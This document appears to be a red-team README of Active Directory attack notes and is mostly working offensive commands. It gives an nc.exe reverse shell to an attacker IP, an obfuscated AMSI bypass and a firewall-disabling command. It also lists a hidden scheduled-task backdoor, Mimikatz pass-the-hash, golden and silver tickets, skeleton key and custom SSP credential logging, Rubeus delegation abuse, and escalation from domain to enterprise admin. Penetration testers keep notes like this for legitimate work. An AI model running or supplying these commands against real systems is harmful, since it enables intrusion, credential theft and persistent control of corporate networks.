# Red-Team-Notes
This repository contains notes for execution of attack scenarios in AD environments and some other useful commands.<br>
AD module can be found at [Microsoft](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps) or at [Nikhil's repo](https://github.com/samratashok/ADModule)

This repo is a collection of notes and commands that I keep on forgetting rather than reference to chain an attack.
# Contents

[1. Local Privilege Escalation](#1-local-privilege-escalation)

- 1.1 Scripts<br>
- 1.2 SCManager<br>

[2. Lateral Movement](#2-lateral-movement)

- 2.1 Explicit Creds<br>
- 2.2 Add hosts to trusted sources<br>
- 2.3 "Overpass the hash"

[3. Defense Evasion](#3-defense-evasion)

- 3.1 AMSI Bypass<br>
- 3.2 Disable Local Firewall<br>
- 3.3 Bypass UAC (fodhelper.exe)<br>
- 3.4 Bypass UAC (cmstp.exe)<br>
- 3.5 Bypass CLM

[4. Persistence](#4-persistence)

- 4.1 Local Persistence: Scheduled Tasks<br>
- 4.2 Domain Persistence: Silver Ticket<br>
- 4.3 Domain Persistence: Golden Ticket<br>
- 4.4 Domain Persistence: Skeleton Key<br>
- 4.5 Domain Persistence: DSRM<br>
- 4.6 Domain Persistence: Custom SSP

[5. Privilege Escalation](#5-privilege-escalation)

- 5.1 Constrained Delegation<br>
- 5.2 LAPS Passwords<br>
- 5.3 Resource-Based Constraint Delegation

[6. Miscellaneous Commands](#6-miscellaneous-commands)

# 1 Local Privilege Escalation
1.1 Scripts:
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- BeRoot: https://github.com/AlessandroZ/BeRoot
- Privesc: https://github.com/enjoiz/Privesc

1.2 SCManager. Source: [https://recipeforroot.com/scmanger/](https://recipeforroot.com/scmanger/)
- First step is to run “sc sdshow scmanager” in cmd.exe which gives the permissions of what users/groups can access this service
- Create a service using the sc.exe command in a command prompt
sc create MyService displayName= "MyService" binPath= "C:\Windows\System32\net.exe localgroup Administrators itemployee21 /add" start= auto
# 2 Lateral Movement
2.1 Spawn Reverse Shell With Explicit Creds

$username='domain\username'<br>
$password='secretPassword'<br>
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force<br>
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process .\nc.exe -ArgumentList '10.10.xx.xx 4445 -e cmd.exe' -Credential $credential

2.2 Add host to trusted sources

Set-Item WSMan:\localhost\Client\TrustedHosts *

2.3 "Overpass the hash" generate tokens from hashes

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:subdomain.domain.local /ntlm:<ntlmhash> /run:powershell.exe"'

# 3 Defense evasion
3.1 AMSI Bypass Source: [https://recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

3.2 Disable Local Firewall

Get firewall profiles
get-netfirewallprofile -profile domain,public,private | format-table -property name,enabled

Disableprofiles
set-netfirewallprofile -profile domain,public,private -enabled false

3.3 Bypass UAC with FodHelper.exe [https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)

- Spawn reverse shell (or execute payload) to bypass UAC. Please see fodhelperBypass.ps1

3.4 Bypass UAC with CMSTP [https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)

3.5 Bypass PowerShell Constrained Language Mode

Please refer to CLMBypass.ps1. The script utilizes System.Management.Automation.PowerShell.Runspace to bypass CLM. Assembly compiled to .exe executable, but the script can be modified to be chained with AppLocker bypass scenarios.

# 4 Persistence

4.1 Local persistence: Scheduled tasks

schtasks /create /sc minute /mo 1 /tn evil /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass c:\temp\rev.ps1" /f

4.2 Domain Persistence: Silver Ticket

Using hash of the Domain Controller computer account, below command provides access to shares on the DC
Invoke-Mimikatz -Command '"kerberos::golden /domain:subdomain.domain.local /sid:sid:S-1-5-21-268341927-4156871508-1792461683 /target:dc.subdomain.domain.local /service:CIFS /rc4:a9b30e5b0dc865eadcea9411e4ade72d /user:Administrator /ptt'

4.3 Domain Persistence: Golden Ticket

Execute mimikatz on DC as DA to get krbtgt hash
	Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc
  
4.4 Domain Persistence: Skeleton Key

Inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required

Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc


In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
	mimikatz # privilege:debug
 	mimikatz # !+
	mimikatz # !processprotect /process:lsass.exe /remove
	mimikatz # misc::skeleton
	mimikatz # !-
 
 IT'S VERY NOISY!

4.5 Domain Persistence: DSRM

- Dump DSRM password (needs DA privs)
	Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
  
- the Logon Behavior for the DSRM account needs to be changed before we can use its hash
	Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

	Enter-PSSession -Computername dcorp-dc Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 
  
4.6 Domain Persistence: Custom SSP

- Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
	$packages = Get-ItemProperty HTKLM:\System\CurrentControlSet\Control\Lsa\OSConfig \ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
	$packages += "mimilib"
	Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' - Values $packages
	Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

- Using mimikatz, inject into lsass (Not stable with server 2016)
	Invoke-Mimikatz -Command '"misc::memssp"'

All local logons on the DC are logged to C:\Windows\system32\kiwissp.log

# 5 Privilege Escalation

5.1 Rubeus Constained Delegation
.\Rubeus.exe s4u /user:dbservice /domain:sub.domain.local /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:"Administrator" /msdsspn:"time/ufc-dc1" /altservice:cifs /ptt

5.2 LAPS passwords

Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |
Where-Object{($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member -NoteProperty 'IdentitySID' $(Convert-NameToSid. $_IdentityReference).SID; $_}

5.3 Resource-Based Constrained Delegation

. .\powermad.ps1

new-machineaccount -domain sub.domain.local -domaincontroller 192.168.4.2 -machineaccount attacker -Password (ConvertTo-Securestring 'Password123' -AsPlainText -Force) -Verbose

#import ADModule
set-adcomputer <target> -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose 

.\Rubeus.exe s4u /user:attacker$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:http/<target> /ptt

5.4 From DA to EA

invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-4056425676-3036975250-1243519898 /sids:S-1-5-21-3331877400-209796306-1317730910-519 /rc4:da6010de93e6e1c94bdd90bb42a9920e /ptt"'

SID parameter refers to current domain SID. SIDS is a combination of target domain SID + 519 (Enterprise Admins group). rc4: is krbtgt hash or external trust key (can be dumped by Invoke-Mimikatz -Command '"lsadump::lsa patch"' on dc)

# 6 Miscellaneous Commands

- Use CEWL to generate wordlist

cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers 
./ffuf -w /usr/share/wordlists/dns1.txt -u http://FUZZ.fabricorp.local 

- Pattator http_fuzz module

patator http_fuzz url=http://172.31.179.1/intranet.php method=POST follow=1 accept_cookie=1 body="Username=FILE0&Password=123" 0=users -x ignore:fgrep='Invalid' proxy_type="http" proxy="127.0.0.1:8080" -t 25

- Local Enumeration Scripts: HostEnum.ps1 [https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)

